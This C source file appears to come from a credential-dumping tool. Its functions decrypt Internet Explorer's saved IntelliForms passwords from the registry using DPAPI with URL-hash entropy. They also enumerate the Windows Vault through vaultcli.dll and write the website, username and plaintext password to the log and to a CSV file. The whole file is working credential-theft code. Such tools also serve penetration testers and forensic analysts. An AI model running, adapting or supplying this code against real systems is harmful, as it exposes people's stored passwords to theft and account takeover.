#pragma clang diagnostic push
#pragma ide diagnostic ignored "hicpp-signed-bitwise"
#include "explorer.h"
#include "specific_win.h"
#include "specific.h"
#include "main.h"

#include "log.h"
#include "functions.h"


VaultEnumerateVaults_t VaultEnumerateVaults = NULL;
VaultOpenVault_t VaultOpenVault = NULL;
VaultEnumerateItems_t VaultEnumerateItems = NULL;
VaultGetItem_t VaultGetItem = NULL;
VaultCloseVault_t VaultCloseVault = NULL;
VaultFree_t VaultFree = NULL;
HMODULE module_vault;

/** 
 * DPAPI decryption using an password
 *
 * @return 1 on success, -1 on failure
 */
int dpapi_decrypt_entropy(char *cipher_data, int len_cipher_data, wchar_t *entropy_password, int len_entropy_password, char **plaintext_data) {
	DATA_BLOB encrypted_blob, decrypted_blob, entropy_blob;
	encrypted_blob.cbData = len_cipher_data;
	encrypted_blob.pbData = cipher_data;
	entropy_blob.cbData = len_entropy_password;
	entropy_blob.pbData = (unsigned char *)entropy_password;

	if(!CryptUnprotectData(&encrypted_blob, NULL, &entropy_blob, NULL, NULL, 0, &decrypted_blob)) {
		log_error("CryptUnprotectData() failure");
		return -1;
	}
	*plaintext_data = malloc(decrypted_blob.cbData + 1);
	if(*plaintext_data == 0) {
		log_error("malloc() failure");
		free(*plaintext_data);
		return -1;
	}
	memcpy(*plaintext_data, decrypted_blob.pbData, decrypted_blob.cbData);
	(*plaintext_data)[decrypted_blob.cbData] = '\0';

	return 1;
}


/**
 * Get the IE URLs registry from the "TypeURLs" entry
 *
 * @return 1 on success, -1 on failure
 */
int get_registry_history(IEUrl *urls, int *n_urls, int nHowMany) {
	char szTemp[8];
	HKEY hKey;
	DWORD dwLength, dwType;
	
	if(RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\TypedURLs", 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS) {
		log_error("RegOpenKeyEx() failure");
		return -1;
	}
	
	int added_urls = *n_urls;
	int nURL;
	for(nURL = 0; nURL < nHowMany; nURL++){
		sprintf(szTemp, "url%d", (nURL + 1));
		if(RegQueryValueExA(hKey, szTemp, NULL, NULL, NULL, &dwLength) == ERROR_SUCCESS){
			char *szURL = (char *)malloc(dwLength+1);
			if(szURL == 0) {
				log_error("malloc() failure");
				return -1;
			}
			if(RegQueryValueExA(hKey, szTemp, NULL, &dwType, szURL, &dwLength) == ERROR_SUCCESS){
				if(dwType == REG_SZ) {
					*n_urls+=1;
					memcpy(urls[nURL+added_urls].url, szURL, dwLength);
					urls[nURL+added_urls].url[dwLength] = '\0';

					// 1 wide char = 2 bytes
					int utf_length = (int)dwLength*2;
					mbstowcs(urls[nURL+added_urls].utf_url, szURL, dwLength);
					urls[nURL+added_urls].url[utf_length] = '\0';
				}
			}
			free(szURL);
		}
	}
	RegCloseKey(hKey);
	return 1;
}

/**
 * Get the SHA1 hash value for a given url
 *
 * @return
 */
void get_url_hash(wchar_t *wstrURL, char *strHash, int dwSize) {
	HCRYPTPROV hProv = 0;
	HCRYPTHASH hHash = 0;

	CryptAcquireContext(&hProv, 0, 0, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
	CryptCreateHash(hProv,CALG_SHA1, 0, 0,&hHash);
	if(CryptHashData(hHash, (const BYTE *)wstrURL, (wcslen(wstrURL)+1)*2, 0)) {
		DWORD dwHashLen=20;
		BYTE Buffer[20];

		if(CryptGetHashParam(hHash, HP_HASHVAL, Buffer, &dwHashLen,0)) {
			char TmpBuf[MAX_HASH_SIZE];
			unsigned char tail=0;

			for(int i=0;i<20;i++) {
				unsigned char c = Buffer[i];
				tail+=c;
				sprintf_s(TmpBuf, MAX_HASH_SIZE, "%s%2.2X", strHash, c);
				strcpy_s(strHash, dwSize, TmpBuf);
			}
			// add the last 2 bytes
			sprintf_s(TmpBuf, MAX_HASH_SIZE, "%s%2.2X",strHash,tail);
			strcpy_s(strHash, dwSize, TmpBuf);
		}
		CryptDestroyHash(hHash);
	}
	CryptReleaseContext(hProv, 0);
}

/**
 * Get the IE history
 *
 * @return 1 on success, -1 on failure
 */
int get_ie_history() {
	// TODO

	return 1;
}

/**
 * Add Some obvious websites to the list of websites
 *
 * @return
 */
void add_known_websites(IEUrl *urls, int *n_urls) {
	// https://stackoverflow.com/questions/4832082/c-double-character-pointer-declaration-and-initialization
	unsigned char *known_websites[] = {"https://www.facebook.com/", "https://m.facebook.com/", "https://www.gmail.com/", "https://accounts.google.com/", "https://accounts.google.com/servicelogin"};
	int total_size = sizeof(known_websites) / sizeof(*known_websites);
	for(int i = 0; i < total_size; i++) {
		memcpy(urls[i].url, known_websites[i], strlen(known_websites[i]));
		urls[i].url[strlen(known_websites[i])] = '\0';
		mbstowcs(urls[i].utf_url, urls[i].url, strlen(urls[i].url));
		urls[i].utf_url[strlen(urls[i].url)*2] = '\0';
		*n_urls+=1;
	}
}

/**
 * Main function to retrieve credentials from the registry
 *
 * @return 1 on success, -1 on failure
 */
int get_ie_registry_creds(const char *output_file) {
	IEUrl urls[MAX_URL_HISTORY];
	int n_urls = 0;
	add_known_websites(urls, &n_urls);
	if(get_registry_history(urls, &n_urls, MAX_URL_HISTORY - n_urls) == -1) {
		log_error("get_registry_history() failure");
	}
	// get_ie_history(urls);

	HKEY hKey;
	if(ERROR_SUCCESS != RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2", 0, KEY_QUERY_VALUE, &hKey)) {
		log_error("RegOpenKeyEx() failure");
		return -1;
	} 

	char url_hash[MAX_HASH_SIZE];
	char reg_hash[MAX_HASH_SIZE];
	DWORD size = MAX_HASH_SIZE;
	int i = 0;
	char *decrypted_data;

	while(ERROR_NO_MORE_ITEMS != RegEnumValue(hKey, i, reg_hash, &size, NULL,NULL, NULL, NULL)) {
		for(int j = 0; j < n_urls; j++) {
			memset(url_hash, 0, MAX_HASH_SIZE);
			get_url_hash(urls[j].utf_url, url_hash, MAX_HASH_SIZE);
			if(strcmp(url_hash, reg_hash) == 0) {
				int len_cipher_data = CIPHER_SIZE_MAX;
				char cipher_data[len_cipher_data];
				if(RegQueryValueEx(hKey, reg_hash, 0, &size, cipher_data, (long unsigned int *)&len_cipher_data) != ERROR_SUCCESS) {
					log_error("RegQueryValueEx() failure");
				}

				size_t url_length = (wcslen(urls[j].utf_url)+1)*2;
				if(dpapi_decrypt_entropy(cipher_data, len_cipher_data, urls[j].utf_url, url_length, &decrypted_data) == -1) {
					log_error("dpapi_decrypt() failure");
				}
				print_decrypted_data(decrypted_data, urls[j].url, output_file);
				free(decrypted_data);
			}
		}
		// Needed to for the next entry
		size = MAX_HASH_SIZE;
		i++;
	}
	RegCloseKey(hKey);

	return 1;
}

/** 
 * Function to print the registry DPAPI decrypted data
 *
 * @return 1 on success, -1 on failure
 */
int print_decrypted_data(char *decrypted_data, char *url, const char *output_file) {
	unsigned int HeaderSize;
	unsigned int DataMax;
	memcpy(&HeaderSize,&decrypted_data[4],4);
	memcpy(&DataMax,&decrypted_data[20],4);
	//printf("HeaderSize=%d DataMax=%d\n",HeaderSize,DataMax);

	FILE *output_fd = NULL;
	if(output_file != NULL) {
		output_fd = fopen(output_file, "ab");
	}

	char *pInfo = &decrypted_data[36];
	for(int n = 0; n < (int)DataMax; n++){
		//FILETIME ft,ftLocal;
		//SYSTEMTIME st;
		//memcpy(&ft,pInfo+4,8);
		//FileTimeToLocalFileTime(&ft,&ftLocal);
		//FileTimeToSystemTime(&ftLocal, &st);
		
		unsigned int offset;
		memcpy(&offset,pInfo,4);
		if(n % 2 == 0) {
			log_success("Website : %s", url);
			log_success("Username : %ls", (wchar_t *)&decrypted_data[HeaderSize+12+offset]);
			if(output_file != NULL) {
				fprintf(output_fd, "\"%s\",\"%ls\",", url, (wchar_t *)&decrypted_data[HeaderSize+12+offset]);
			}
		}
		else {
			log_success("Password: %ls\n", (wchar_t *)&decrypted_data[HeaderSize+12+offset]);
			if(output_file != NULL) {
				fprintf(output_fd, "\"%ls\"\n", (wchar_t *)&decrypted_data[HeaderSize+12+offset]);
			}
		}

		// Data is 16 bytes length padded 
		pInfo+=16;
	}

	if(output_file != NULL) {
		fclose(output_fd);
	}
	return 1;
}

/** 
 * Load the Windows IE necessary functions from the vaultcli
 *
 * @return 1 on success, -1 on failure
 */
int load_ie_vault_libs() {
	module_vault = LoadLibrary("vaultcli.dll");
	if(module_vault == NULL) {
		log_error("LoadLibary() failure");
		return -1;
	}

	VaultEnumerateVaults = (VaultEnumerateVaults_t) GetProcAddress(module_vault, "VaultEnumerateVaults");
	VaultOpenVault = (VaultOpenVault_t)GetProcAddress(module_vault, "VaultOpenVault");
	VaultEnumerateItems = (VaultEnumerateItems_t)GetProcAddress(module_vault, "VaultEnumerateItems");
	VaultGetItem = (VaultGetItem_t)GetProcAddress(module_vault, "VaultGetItem");
	VaultCloseVault = (VaultCloseVault_t)GetProcAddress(module_vault, "VaultCloseVault");
	VaultFree = (VaultFree_t)GetProcAddress(module_vault, "VaultFree");

	if (!VaultEnumerateItems || !VaultEnumerateVaults || !VaultFree || !VaultOpenVault || !VaultCloseVault || !VaultGetItem) {
		log_error("GetProcAddress() failure");
		FreeLibrary(module_vault);
		return -1;						
	}

	return 1;
}

/** 
 * Main function to retrieve vault IE credentials
 *
 * @return 1 on success, -1 on failure
 */
int get_ie_vault_creds(const char *output_file) {
	if(load_ie_vault_libs() == -1) {
		log_error("load_explorer_libs() failure");
		return -1;
	}

	DWORD vaults_counter, items_counter;
	LPGUID vaults;
	HANDLE hVault;
	PVOID items;
	PVAULT_ITEM vault_items, pvault_items;
	//PVAULT_ITEM_7 vault_test, pvault_test;

	if(VaultEnumerateVaults(0, &vaults_counter, &vaults) != ERROR_SUCCESS) {
		log_error("VaultEnumerateVaults() failure");
		return -1;
	}

	FILE *output_fd = NULL;
	if(output_file != NULL) {
		output_fd = fopen(output_file, "ab");
	}

	for(int i = 0; i < (int)vaults_counter; i++) {
		// We open the vault
		if (VaultOpenVault(&vaults[i], 0, &hVault) != ERROR_SUCCESS) {
			log_error("VaultOpenVault() failure");
			return -1;
		}

		if (VaultEnumerateItems(hVault, 512, &items_counter, &items) != ERROR_SUCCESS) {
			log_error("VaultEnumerateItems() failure");
			return -1;
		}
		vault_items = (PVAULT_ITEM)items;

		for(int j = 0; j < (int)items_counter; j++) {
			log_success("Source: %ls", vault_items[j].FriendlyName);
			log_success("Website: %ls", vault_items[j].Resource->data.String);
			log_success("Username: %ls", vault_items[j].Identity->data.String);

			pvault_items = NULL;
			if (VaultGetItem(hVault, &vault_items[j].SchemaId, vault_items[j].Resource, vault_items[j].Identity, vault_items[j].PackageSid, NULL, 0, &pvault_items) != 0) {
				log_error("VaultGetItem() failure");	
			}

			// If the password is not empty
			if (pvault_items->Authenticator != NULL && pvault_items->Authenticator->data.String != NULL) {
				log_success("Password: %ls\n", pvault_items->Authenticator->data.String);
			}

			// FIXME: Handle if password is empty
			if(output_file != NULL) {
				fprintf(output_fd, "\"%ls\",\"%ls\",\"%ls\"", vault_items[j].Resource->data.String, vault_items[j].Identity->data.String, pvault_items->Authenticator->data.String);
			} 
			VaultFree(pvault_items);
		}	
		VaultFree(vault_items);
		VaultCloseVault(&hVault);
	}

	// We clean everything
	if(output_file != NULL) {
		fclose(output_fd);
	}
	VaultFree(vaults);
	FreeLibrary(module_vault);
	return 1;
}

/**
 * IE functions wrapper that sets up everything we need
 *
 * @return 1 on success, -1 on failure 
 */
int dump_explorer(const char *output_file) {
	log_info("Starting IE10 / MSEdge dump...\n");
	if(get_ie_vault_creds(output_file) == -1) {
		log_error("get_ie_vault_creds() failure");
	}

	log_info("Starting IE7-IE9 dump...\n");
	if(get_ie_registry_creds(output_file) == -1) {
		log_error("get_ie7_ie9_creds() failure");
	}
	
	return 1;
}

#pragma clang diagnostic pop